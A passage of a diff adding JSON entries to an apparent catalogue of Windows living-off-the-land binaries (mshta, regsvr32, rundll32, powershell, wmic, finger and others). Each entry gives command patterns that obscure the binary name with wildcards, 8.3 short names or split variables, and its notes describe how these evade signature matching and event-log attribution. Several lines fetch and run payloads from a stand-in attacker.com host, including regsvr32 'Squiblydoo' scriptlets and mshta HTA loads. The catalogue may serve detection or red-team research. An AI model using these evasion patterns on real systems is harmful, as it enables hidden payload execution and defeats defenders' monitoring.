+      "https://attack.mitre.org/techniques/T1105/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Esentutl/"
+    ]
+  },
+  {
+    "Name": "expand",
+    "Description": "Expands compressed CAB archive files. Can extract payloads from CAB containers to disk.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\expand.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1140",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where exp?nd.exe') do %i payload.cab -F:* C:\\out\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'a' \u2014 uniquely matches expand.exe without hitting expr.exe"
+      },
+      {
+        "Pattern": "for /f %i in ('where e*nd.exe') do %i payload.cab -F:* C:\\out\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'xpa' \u2014 resolves to expand.exe (both System32 and Git paths if present)"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\exp?nd.exe') do %i payload.cab -F:* C:\\out\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "dir /b in System32 with exp?nd.exe \u2014 avoids ambiguity with expr.exe or explorer.exe that exp*.exe would match"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m exp?nd.exe /c \"@file payload.cab -F:* C:\\out\\\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "forfiles ? mask finds expand.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\expand.exe payload.cab -F:* C:\\out\\",
+        "Wildcards": [],
+        "Notes": "Direct invocation \u2014 -F:* extracts all files from the CAB"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\exp?nd.exe) do @%i payload.cab -F:* C:\\out\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 exp?nd uniquely matches expand.exe without hitting explorer.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32 exp?nd.exe') do %i payload.cab -F:* C:\\out\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Recursive where search \u2014 ? wildcard avoids matching explorer.exe or other exp*.exe files",
+        "Method": "where /r recursive"
+      }
+    ],
+    "PlatformNotes": "expand.exe is a built-in Windows utility for extracting CAB files. The `-F:*` flag extracts all files. It is less monitored than certutil for file staging. In batch scripts use `%%i` instead of `%i`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1140/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Expand/"
+    ]
+  },
+  {
+    "Name": "extrac32",
+    "Description": "CAB extraction utility bundled with Internet Explorer. Less monitored than expand.exe, can extract payloads from CAB archives.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\extrac32.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1218",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where ext*32.exe') do %i /e /y payload.cab C:\\out\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'rac' between 'ext' and '32'"
+      },
+      {
+        "Pattern": "for /f %i in ('where extrac*.exe') do %i /e /y payload.cab C:\\out\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches '32.exe'"
+      },
+      {
+        "Pattern": "for /f %i in ('where ext?ac32.exe') do %i /e /y payload.cab C:\\out\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'r'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\extrac*.exe') do %i /e payload.cab C:\\out\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b glob finds extrac32.exe in System32"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m ext*32.exe /c \"@file /e payload.cab C:\\out\\\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds extrac32.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\EXTRAC~1.EXE /e /y payload.cab C:\\out\\",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 EXTRAC~1 auto-generated for extrac32.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\extrac*.exe) do @%i /e /y payload.cab C:\\out\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands extrac*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32 extrac*.exe') do %i /e /y payload.cab C:\\out\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search scoped to System32 \u2014 locates extrac32.exe without spelling full binary name",
+        "Method": "where /r recursive"
+      }
+    ],
+    "PlatformNotes": "extrac32.exe is a legacy CAB extraction utility. The `/e` flag extracts all files. It is often overlooked in EDR rule sets compared to certutil or expand. In batch scripts use `%%i` instead of `%i`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1218/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Extrac32/"
+    ]
+  },
+  {
+    "Name": "finger",
+    "Description": "Legacy user info protocol client. Can retrieve arbitrary text from an attacker-controlled finger server, enabling data exfiltration and payload staging.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\finger.exe"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where fin*.exe') do %i user@attacker.com",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ger' after 'fin'"
+      },
+      {
+        "Pattern": "for /f %i in ('where f?nger.exe') do %i user@attacker.com",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'i'"
+      },
+      {
+        "Pattern": "for /f %i in ('where f*r.exe') do %i user@attacker.com",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'inge' between 'f' and 'r'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\fin*.exe') do %i user@attacker.com",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b glob finds finger.exe in System32"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m fin*.exe /c \"@file user@attacker.com\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds finger.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\finger.exe user@attacker.com",
+        "Wildcards": [],
+        "Notes": "Direct invocation \u2014 response from attacker's finger server is printed to stdout"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\fin*.exe) do @%i user@attacker.com",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands fin*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32 fin*.exe') do %i user@attacker.com",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search \u2014 fin* matches finger.exe; scoped to System32 to avoid matching other tools",
+        "Method": "where /r recursive"
+      }
+    ],
+    "PlatformNotes": "finger.exe is enabled on older/misconfigured Windows systems. It queries the RFC 1288 finger protocol (TCP/79). An attacker can run a netcat listener (`nc -l -p 79`) to serve arbitrary data. The response is printed to stdout and can be captured with `for /f`. In batch scripts use `%%i` instead of `%i`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Finger/"
+    ]
+  },
+  {
+    "Name": "forfiles",
+    "Description": "Execute a command for each file matching a wildcard mask. The /m flag accepts glob patterns, and @file expands to the matched filename \u2014 enabling indirect execution of binaries.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\forfiles.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.003",
+    "Patterns": [
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m *.exe /c \"cmd /c @file /?\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "* mask matches all .exe files; @file expands to each filename"
+      },
+      {
+        "Pattern": "forfiles /m *.bat /c \"cmd /c @file\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Execute each .bat file in current directory via cmd"
+      },
+      {
+        "Pattern": "for /f %i in ('where for*.exe') do %i /m *.bat /c \"cmd /c @file\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "where glob resolves forfiles.exe path; nested * mask in /m for batch files"
+      },
+      {
+        "Pattern": "for /f %i in ('where forf?les.exe') do %i /m *.txt /c \"cmd /c @file\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "? wildcard in where query for forfiles itself"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\FORFIL~1.EXE /m *.bat /c \"cmd /c @file\"",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 FORFIL~1 auto-generated for forfiles.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\forf*.exe) do @%i /m *.bat /c \"cmd /c @file\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 resolves forfiles.exe via forf* expansion; /m *.bat then globs within the current directory",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32 forf*.exe') do %i /m *.bat /c \"cmd /c @file\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search locates forfiles.exe; nested /m *.bat glob inside forfiles adds a second layer of wildcard resolution",
+        "Method": "where /r recursive"
+      }
+    ],
+    "PlatformNotes": "forfiles is a native CMD utility. Its `/m` flag accepts standard Windows glob wildcards (`*`, `?`). The special variable `@file` expands to the matched filename (quoted), `@path` to the full path, and `@ext` to the extension. This makes forfiles a unique execution primitive that keeps the binary name out of the command line.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/003/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/",
+      "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/forfiles"
+    ]
+  },
+  {
+    "Name": "mshta",
+    "Description": "Microsoft HTML Application host. Executes HTA files or inline VBScript/JScript \u2014 commonly used for payload execution and initial access.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\mshta.exe",
+      "C:\\Windows\\SysWOW64\\mshta.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1218.005",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where mshta*') do %i http://attacker.com/payload.hta",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches '.exe'"
+      },
+      {
+        "Pattern": "for /f %i in ('where m*ta.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star replaces 'sh'"
+      },
+      {
+        "Pattern": "for /f %i in ('where ms?ta.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'h'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\ms*ta.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir glob search"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\ms?ta.exe) do @%i http://attacker.com/payload.hta",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 ms?ta uniquely matches mshta.exe in System32",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows ms?ta.exe') do %i http://attacker.com/payload.hta",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds mshta.exe in System32 and SysWOW64",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m ms?ta.exe /c \"@file http://attacker.com/payload.hta\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "forfiles ? mask finds mshta.exe \u2014 @file expands to matched filename for execution"
+      },
+      {
+        "Pattern": "cmd /v:on /c \"set x=mshta& !x! http://attacker.com/payload.hta\"",
+        "Wildcards": [],
+        "Notes": "Delayed variable expansion \u2014 /v:on enables !var! syntax; !x! resolves at runtime, evading parse-time static analysis",
+        "Method": "Delayed expansion"
+      },
+      {
+        "Pattern": "cmd /c for /f %i in ('where m*ta.exe') do %i http://attacker.com/payload.hta",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "cmd /c wrapper adds an extra process layer \u2014 glob still resolves via where; parent process becomes cmd.exe not the caller",
+        "Method": "cmd /c indirection"
+      },
+      {
+        "Pattern": "for /f %i in ('where mshta*') do start \"\" /b %i http://attacker.com/payload.hta",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "start /b launches mshta.exe as a detached background process \u2014 changes parent process attribution in event logs",
+        "Method": "start indirection"
+      }
+    ],
+    "PlatformNotes": "mshta.exe can run HTA files from local paths or URLs. Example: `mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"cmd\"\":close\")`. Blocked by many modern AV products but glob name obfuscation may bypass signature matching on process names.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1218/005/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+    ]
+  },
+  {
+    "Name": "powershell.exe",
+    "Description": "PowerShell executable launched from CMD. Bypasses CMD-level restrictions by delegating to PowerShell runtime.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where powers*') do %i -nop -w hidden -c IEX(...)",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'hell.exe'"
+      },
+      {
+        "Pattern": "for /f %i in ('where power?hell.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 's'"
+      },
+      {
+        "Pattern": "for /f %i in ('where p*hell.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'owers'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\power*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Full path dir glob"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32\\WindowsPowerShell\\v1.0 /m power*.exe /c \"@file -nop -c whoami\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds powershell.exe in its install directory \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\WINDOW~1\\v1.0\\POWERS~1.EXE -nop -c whoami",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 WINDOW~1 for WindowsPowerShell, POWERS~1 for powershell.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\power*.exe) do @%i -nop -c whoami",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands power*.exe in the PowerShell install directory",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows power?hell.exe') do %i -nop -c whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds powershell.exe in WindowsPowerShell subdirectory without spelling the full path",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "set a=powers& set b=hell& call %a%%b%.exe -nop -c whoami",
+        "Wildcards": [],
+        "Notes": "Binary name split across two SET variables \u2014 CALL resolves %a%%b%.exe=powershell.exe; name never appears as a literal string",
+        "Method": "set variable building"
+      },
+      {
+        "Pattern": "for /f %i in ('where power?hell.exe') do start \"\" /b %i -nop -c whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "start /b launches powershell.exe as a detached background process \u2014 changes parent process attribution in event logs",
+        "Method": "start indirection"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Powershell/"
+    ]
+  },
+  {
+    "Name": "regsvr32",
+    "Description": "Registers and unregisters OLE controls. Can execute remote scriptlets (scrobj.dll) \u2014 the 'Squiblydoo' technique.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\regsvr32.exe",
+      "C:\\Windows\\SysWOW64\\regsvr32.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1218.010",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where regsvr3?.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces '2'"
+      },
+      {
+        "Pattern": "for /f %i in ('where r*svr32.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star replaces 'eg'"
+      },
+      {
+        "Pattern": "for /f %i in ('where regsvr*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches '32'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\regsvr*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir glob search"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\regsvr*.exe) do @%i /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands regsvr*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows regsvr*.exe') do %i /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds regsvr32.exe in System32 and SysWOW64",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m regsvr*.exe /c \"@file /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds regsvr32.exe \u2014 @file expands to matched filename for Squiblydoo execution"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\REGSVR~1.EXE /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 REGSVR~1 auto-generated for regsvr32.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "cmd /c for /f %i in ('where regsvr*.exe') do %i /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "cmd /c wrapper adds an extra process layer \u2014 glob resolves via where; parent process becomes cmd.exe not the caller",
+        "Method": "cmd /c indirection"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1218/010/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
+    ]
+  },
+  {
+    "Name": "replace",
+    "Description": "Replaces (copies) files from a source to a destination directory. Can be used to stage payloads by copying files into target directories.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\replace.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where replac*.exe') do %i C:\\source\\payload.exe C:\\dest\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "replac* uniquely matches replace.exe \u2014 rep*.exe is too broad (also hits repair-bde.exe)"
+      },
+      {
+        "Pattern": "for /f %i in ('where r?place.exe') do %i C:\\source\\payload.exe C:\\dest\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "for /f %i in ('where replac?.exe') do %i C:\\source\\payload.exe C:\\dest\\",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces last char 'e'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\replac*.exe') do %i C:\\src\\p.exe C:\\dst\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b in System32 with replac* \u2014 avoids also matching repair-bde.exe"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m replac*.exe /c \"@file C:\\source\\p.exe C:\\dest\\\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles replac* mask uniquely matches replace.exe in System32"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\replace.exe C:\\source\\payload.exe C:\\dest\\ /a",
+        "Wildcards": [],
+        "Notes": "Direct invocation \u2014 /a adds files that don't already exist in destination"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\replac*.exe) do @%i C:\\source\\payload.exe C:\\dest\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 replac* uniquely matches replace.exe, avoiding repair-bde.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32 replac*.exe') do %i C:\\source\\payload.exe C:\\dest\\",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search scoped to System32 \u2014 replac* uniquely matches replace.exe without hitting repair-bde.exe",
+        "Method": "where /r recursive"
+      }
+    ],
+    "PlatformNotes": "replace.exe copies files from a source to a destination directory (not filename-to-filename). The `/a` flag adds files that are not already present. It is rarely monitored as a file-transfer utility. In batch scripts use `%%i` instead of `%i`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Replace/"
+    ]
+  },
+  {
+    "Name": "rundll32",
+    "Description": "Loads and runs DLLs. Used to execute malicious DLL exports directly, bypassing application whitelisting.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\rundll32.exe",
+      "C:\\Windows\\SysWOW64\\rundll32.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1218.011",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where rundll3?.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces '2'"
+      },
+      {
+        "Pattern": "for /f %i in ('where r*32.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'undll'"
+      },
+      {
+        "Pattern": "for /f %i in ('where rundll*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches '32'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\rundll*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir glob search"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\rundll*.exe) do @%i evil.dll,DllMain",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands rundll*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows rundll*.exe') do %i evil.dll,DllMain",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds rundll32.exe in System32 and SysWOW64",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m rundll*.exe /c \"@file evil.dll,DllMain\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds rundll32.exe \u2014 @file expands to matched filename for DLL execution"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\RUNDLL~1.EXE evil.dll,DllMain",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 RUNDLL~1 auto-generated for rundll32.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "set a=rundll& set b=32& call %a%%b%.exe evil.dll,DllMain",
+        "Wildcards": [],
+        "Notes": "Binary name split across two SET variables \u2014 CALL resolves %a%%b%.exe=rundll32.exe; name never appears as a literal string",
+        "Method": "set variable building"
+      },
+      {
+        "Pattern": "cmd /c for /f %i in ('where rundll*.exe') do %i evil.dll,DllMain",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "cmd /c wrapper adds an extra process layer \u2014 glob resolves via where; parent process becomes cmd.exe not the caller",
+        "Method": "cmd /c indirection"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1218/011/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
+    ]
+  },
+  {
+    "Name": "wmic",
+    "Description": "WMI command-line interface. Used for system information gathering, remote execution, process creation, and persistence.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\wbem\\wmic.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1047",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where wmi?.exe') do %i process call create cmd.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'c'"
+      },
+      {
+        "Pattern": "for /f %i in ('where wmi*c.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star intentionally matches nothing (or variant chars); more specific than w*c.exe to avoid ambiguity with windmc.exe"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\wbem\\wmi?.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path dir glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where wmic*') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Trailing star matches '.exe'"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\wbem\\wmi?.exe) do @%i process call create cmd.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 wmi? uniquely matches wmic.exe in the wbem subdirectory",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32\\wbem wmi?.exe') do %i process call create cmd.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Recursive where search scoped to wbem directory \u2014 wmic.exe lives in System32\\wbem, not directly in System32",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32\\wbem /m wmi?.exe /c \"@file process call create cmd.exe\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "forfiles ? mask scoped to the wbem subdirectory where wmic.exe resides \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "cmd /c for /f %i in ('where wmi?.exe') do %i process call create cmd.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "cmd /c wrapper adds an extra process layer \u2014 glob resolves via where; parent process becomes cmd.exe not the caller",
+        "Method": "cmd /c indirection"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1047/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
+    ]
+  },
+  {
+    "Name": "wscript",
+    "Description": "Windows Script Host GUI runner for JScript and VBScript. Executes scripts without a visible console window.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\wscript.exe",
+      "C:\\Windows\\SysWOW64\\wscript.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.005",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where ws?ript.exe') do %i script.vbs",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'c'"
+      },
+      {
+        "Pattern": "for /f %i in ('where w*ript.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'sc' after 'w'"
+      },
+      {
+        "Pattern": "for /f %i in ('where wsc*.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches 'ript.exe'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\wsc*.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b glob finds wscript.exe in System32"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m ws?ript.exe /c \"@file script.vbs\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "forfiles ? mask finds wscript.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\WSCRIP~1.EXE script.vbs",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 WSCRIP~1 auto-generated for wscript.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\wsc*.exe) do @%i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands wsc*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows wsc*.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds wscript.exe in System32 and SysWOW64",
+        "Method": "where /r recursive"
+      },
+      {
